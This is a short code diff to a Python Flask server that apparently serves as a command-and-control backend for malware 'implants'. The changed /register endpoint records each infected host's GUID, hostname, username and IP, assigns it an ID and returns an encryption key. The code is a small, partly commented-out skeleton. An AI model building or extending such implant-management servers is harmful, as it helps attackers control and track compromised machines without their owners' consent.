@@ -9,6 +9,7 @@ import multiprocessing as mp
 from multiprocessing import Process
 import requests 
 from app.app import createFlaskApp
+import uuid
 
 
 """控制端表"""
@@ -59,14 +60,17 @@ def add_request():
 
 @app.route("/register", methods=['POST', 'GET'])
 def addAgent():
+    implant_id = str(uuid.uuid4())
     fromimplant = request.get_json()
+    guid = fromimplant['guid']
+    hostname = fromimplant['hostname']
+    username = fromimplant['username']
     implant_ip = request.environ['REMOTE_ADDR']
-    print(fromimplant, implant_ip)
-    #guid, hostname, username = fromimplant[0]
+    print(fromimplant, implant_ip, implant_id)
     encryption_key = encryptionkey()
-    #agent = agents(guid, hostname, username, encryptionkey)
+    #agent = agents(implant_id, guid, hostname, username, implant_ip, encryptionkey)
     #addtodatabase(agent)
-    return encryption_key
+    return jsonify(encryption_key)
 
 def encryptionkey():
     #if encryptionkey == None:
